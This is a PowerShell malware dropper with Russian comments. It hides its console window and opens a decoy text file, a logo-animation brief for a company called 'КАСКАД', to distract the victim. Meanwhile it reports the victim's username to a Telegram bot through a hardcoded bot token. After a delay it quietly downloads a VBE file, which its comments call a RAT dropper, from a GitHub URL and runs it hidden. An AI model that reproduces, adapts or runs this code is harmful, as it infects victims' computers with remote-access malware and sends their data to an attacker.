# СКРЫВАЕМ ОКНО POWERSHELL
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0)

# СОЗДАЁМ И ЗАПУСКАЕМ ЛЕГИТИМНЫЙ TXT
$fileName = "КАСКАД_анимация_логотипа_ТЗ.txt"
$filePath = Join-Path $env:LOCALAPPDATA $fileName

$content = @"
Цели и тон анимации
Цель: усилить узнаваемость бренда, использовать в видеоинтро, на сайте и в презентациях.
Тон: строгий, профессиональный, индустриальный; ощущение прочности и точности; динамика умеренная, без излишней игривости.
Ключевые акценты: каскадная структура слоёв, металл, сборка/монтаж, надёжность.

Концепт и сценарий анимации
1. Стартовый кадр
   Тёмный нейтральный фон; появляется тонкая световая линия, которая чертит контуры каскадного знака.
2. Формирование знака
   Слои знака собираются последовательно сверху вниз как металлические пластины: плавное появление с лёгким металлическим бликом и звуком стука/сборки (опционально).
3. Появление текста
   После сборки знака справа проявляется слово КАСКАД: буквы появляются поочерёдно или выезжают из‑под слоя, фиксируются с лёгким акцентом.
4. Финальный акцент
   Короткая вибрация/импульс, лёгкий блик по краю металла и появление подзаголовка (опционально).
5. Завершение
   Плавное затемнение или переход в прозрачность для наложения на видео/фон. Длительность основного цикла 3–5 секунд.

Технические требования
- Длительность: 3–5 секунд основной версии; опционально 10–15 секунд с зацикливанием.
- Форматы на сдачу: MP4 (H.264), WebM, прозрачный MOV (ProRes 4444); GIF по запросу.
- Разрешение: 1920×1080 px (Full HD); 4K по запросу; вертикальная версия 1080×1920 при необходимости.
- Частота кадров: 30 fps (при необходимости 60 fps).
- Цвета: фирменный зелёный и чёрный из логотипа; металлизированные градиенты в пределах палитры.
- Звук: короткий эффект сборки и финальный акцент (опционально) — отдельный WAV/MP3.
- Совместимость: файлы готовы для вставки в видеоредакторы и веб.

Исходники и передача
- Проекты: After Effects (AEP) с подключёнными шрифтами и плагинами; при использовании Cinema 4D — проект C4D и рендеры.
- Логотипы: исходный логотип в векторе (AI/SVG) и растровые PNG с прозрачным фоном.
- Экспорт: MP4, MOV (с прозрачностью), WebM, GIF; PNG sequence по запросу.
- Документация: краткая инструкция по использованию (форматы и рекомендации по наложению).
"@

$content | Out-File -FilePath $filePath -Encoding UTF8
Invoke-Item $filePath

# ОТПРАВЛЯЕМ СООБЩЕНИЕ В TELEGRAM
$Token = "8263447327:AAH2UWtHaUU0i_3OmxK7mzmRLTK8MfsWzSk"
$ChatID = "7063407604"
$CurrentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
$Message = "The user's shortcut was enabled for user: $CurrentUser"

$URL = "https://api.telegram.org/bot$Token/sendMessage"

$Body = @{
    chat_id = $ChatID
    text = $Message
} | ConvertTo-Json

try {
    $Response = Invoke-RestMethod -Uri $URL -Method Post -ContentType "application/json" -Body $Body
} catch {
}

# ЗАДЕРЖКА
Start-Sleep -Seconds 444

# СКРЫТО СКАЧИВАЕМ И ЗАПУСКАЕМ ПЕРЕНОСЧИК RAT
$Url = "https://github.com/Mafin111/MafinREP111/raw/refs/heads/main/SCRRC4ryuk.vbe"
$FileName = "ryuk.vbe"
$LocalAppData = [Environment]::GetFolderPath("LocalApplicationData")
$DownloadPath = Join-Path $LocalAppData $FileName

try {
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile($Url, $DownloadPath)
    
    $processInfo = New-Object System.Diagnostics.ProcessStartInfo
    $processInfo.FileName = $DownloadPath
    $processInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
    $processInfo.CreateNoWindow = $true
    [System.Diagnostics.Process]::Start($processInfo) | Out-Null
}
catch {
	
}


exit